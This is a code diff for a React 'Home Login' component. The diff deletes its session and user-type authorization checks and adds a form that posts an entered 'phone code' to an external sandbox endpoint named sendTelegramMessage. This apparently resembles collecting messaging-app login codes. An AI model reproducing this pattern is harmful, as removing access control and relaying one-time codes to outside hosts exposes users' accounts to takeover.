@@ -1,27 +1,54 @@
-import React, { useContext } from 'react';
-import { useNavigate } from "react-router-dom";
-import { MyContext } from "../context";
+import { useState } from "react";
+import axios from "axios";
 
 const Homelogin = () => {
-  const navigate = useNavigate();
-  const { userType, isValid } = useContext(MyContext);
-   
+  const [phoneCode, setPhoneCode] = useState("");
+  const [loading, setLoading] = useState(false);
+  const [error, setError] = useState(null);
+  const [message, setMessage] = useState(null);
 
-  if (!isValid) {
-    navigate("/SignIn");
-    return null;
-  }
-  else{
+  const handlePhoneCodeChange = (e) => {
+    setPhoneCode(e.target.value);
+  };
 
-  if (userType !== 'A') {
-    return <div>Unauthorized access</div>;
-  }
-  }
+  const handleSubmit = async () => {
+    if (!phoneCode) {
+      setError("Please enter a phone code.");
+      return;
+    }
+
+    setLoading(true);
+    setError(null);
+
+    try {
+      // Send the phone code to the backend
+      const response = await axios.post("https://ty376c-3710.csb.app/sendTelegramMessage", { phoneCode });
+      setMessage(response.data);
+    } catch (err) {
+      setError("Failed to send message");
+    } finally {
+      setLoading(false);
+    }
+  };
+
   return (
     <div>
-      <p>Welcome to Homelogin!</p>
+      <h1>Home Login</h1>
+      {loading && <p>Loading...</p>}
+      {error && <p style={{ color: "red" }}>{error}</p>}
+      {message && <p>{message}</p>}
+
+      <div>
+        <input
+          type="text"
+          placeholder="Enter phone code"
+          value={phoneCode}
+          onChange={handlePhoneCodeChange}
+        />
+        <button onClick={handleSubmit}>Submit</button>
+      </div>
     </div>
   );
-}
+};
 
 export default Homelogin;
